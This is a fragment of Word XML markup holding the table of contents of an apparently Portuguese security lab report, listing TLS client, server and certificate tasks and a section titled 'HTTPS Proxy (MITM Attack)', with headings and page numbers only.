              <w:instrText xml:space="preserve"> PAGEREF _Toc213881898 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>16</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="3854C1FF" w14:textId="6DA64457"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899" w:history="1">
            <w:r w:rsidRPr="00F74358">
              <w:rPr>
                <w:rStyle w:val="Hiperligao"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Certificados e PKI</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc213881899 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>16</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="26A32F20" w14:textId="6013556E"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0" w:history="1">
            <w:r w:rsidRPr="00F74358">
              <w:rPr>
                <w:rStyle w:val="Hiperligao"/>
                <w:noProof/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Task 1: TLS Client</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc213881900 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>16</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="5D53B025" w14:textId="737F18A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1" w:history="1">
            <w:r w:rsidRPr="00F74358">
              <w:rPr>
                <w:rStyle w:val="Hiperligao"/>
                <w:noProof/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Task 1.a: TLS Handshake</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc213881901 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>16</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="6E996D41" w14:textId="2E217005"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2" w:history="1">
            <w:r w:rsidRPr="00F74358">
              <w:rPr>
                <w:rStyle w:val="Hiperligao"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Task 1.b: Certificado da CA</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc213881902 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>18</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="0F015372" w14:textId="6B6D0752"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3" w:history="1">
            <w:r w:rsidRPr="00F74358">
              <w:rPr>
                <w:rStyle w:val="Hiperligao"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Task 1.c: Hostname Check</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc213881903 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>19</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="40EB0791" w14:textId="43F82647"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4" w:history="1">
            <w:r w:rsidRPr="00F74358">
              <w:rPr>
                <w:rStyle w:val="Hiperligao"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Task 1.d: Enviar e Receber Dados</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc213881904 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>20</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="138E26A3" w14:textId="5D559E0B"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5" w:history="1">
            <w:r w:rsidRPr="00F74358">
              <w:rPr>
                <w:rStyle w:val="Hiperligao"/>
                <w:noProof/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Task 2: TLS Server</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc213881905 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>21</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="4F6CF057" w14:textId="7AE9FDB5"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6" w:history="1">
            <w:r w:rsidRPr="00F74358">
              <w:rPr>
                <w:rStyle w:val="Hiperligao"/>
                <w:noProof/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Task 2.a: Servidor TLS Simples</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc213881906 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>21</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="214D0B21" w14:textId="6F476E8C"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7" w:history="1">
            <w:r w:rsidRPr="00F74358">
              <w:rPr>
                <w:rStyle w:val="Hiperligao"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Task 2.b: Teste com Browser</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc213881907 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>22</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="23B0BC71" w14:textId="2DD5517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8" w:history="1">
            <w:r w:rsidRPr="00F74358">
              <w:rPr>
                <w:rStyle w:val="Hiperligao"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Task 2.c: Certificados com Múltiplos Nomes (SAN)</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc213881908 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>23</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="4E3A1184" w14:textId="13358688"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09" w:history="1">
            <w:r w:rsidRPr="00F74358">
              <w:rPr>
                <w:rStyle w:val="Hiperligao"/>
                <w:noProof/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Task 3: HTTPS Proxy (MITM Attack)</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc213881909 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>24</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="24BEE652" w14:textId="711C7569"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0" w:history="1">
            <w:r w:rsidRPr="00F74358">
              <w:rPr>
                <w:rStyle w:val="Hiperligao"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Objetivo</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc213881910 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>24</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="4A96AACF" w14:textId="533167D7"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1" w:history="1">
            <w:r w:rsidRPr="00F74358">
              <w:rPr>
                <w:rStyle w:val="Hiperligao"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Cenário do Ataque</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc213881911 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>24</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="1123AAEF" w14:textId="4F5E1C6A"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2" w:history="1">
            <w:r w:rsidRPr="00F74358">
              <w:rPr>
                <w:rStyle w:val="Hiperligao"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Implementação do Proxy</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc213881912 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>24</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="20613D3C" w14:textId="663C446F"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3" w:history="1">
            <w:r w:rsidRPr="00F74358">
              <w:rPr>
                <w:rStyle w:val="Hiperligao"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Configuração do Ataque</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc213881913 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>25</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="4D76F94B" w14:textId="5A3CCD4D"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4" w:history="1">
            <w:r w:rsidRPr="00F74358">
              <w:rPr>
                <w:rStyle w:val="Hiperligao"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Demonstração do Ataque</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc213881914 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>26</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="68468B8F" w14:textId="4299202F"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5" w:history="1">
            <w:r w:rsidRPr="00F74358">
              <w:rPr>
                <w:rStyle w:val="Hiperligao"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Logs do Ataque</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc213881915 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>26</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="7564DA91" w14:textId="190DF9DC"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6" w:history="1">
            <w:r w:rsidRPr="00F74358">
              <w:rPr>
                <w:rStyle w:val="Hiperligao"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Por que o Ataque Funciona?</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc213881916 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>27</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="3921E2EA" w14:textId="07136D06"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7" w:history="1">
            <w:r w:rsidRPr="00F74358">
              <w:rPr>
                <w:rStyle w:val="Hiperligao"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Importância do Hostname Check</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc213881917 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>27</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="640AF6C2" w14:textId="2A3BC316"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8" w:history="1">
            <w:r w:rsidRPr="00F74358">
              <w:rPr>
                <w:rStyle w:val="Hiperligao"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Verificação de Certificados</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc213881918 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>27</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="13A962D2" w14:textId="19DB8F85"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19" w:history="1">
            <w:r w:rsidRPr="00F74358">
              <w:rPr>
                <w:rStyle w:val="Hiperligao"/>
                <w:noProof/>
              </w:rPr>
              <w:t>SeedLab: Anti-AntiXerox!</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc213881919 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>28</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="6440CCCE" w14:textId="66F2E99F"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0" w:history="1">
            <w:r w:rsidRPr="00F74358">
              <w:rPr>
                <w:rStyle w:val="Hiperligao"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Introdução</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc213881920 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>29</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="24FDF5B8" w14:textId="6C2A60DF"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1" w:history="1">
            <w:r w:rsidRPr="00F74358">
              <w:rPr>
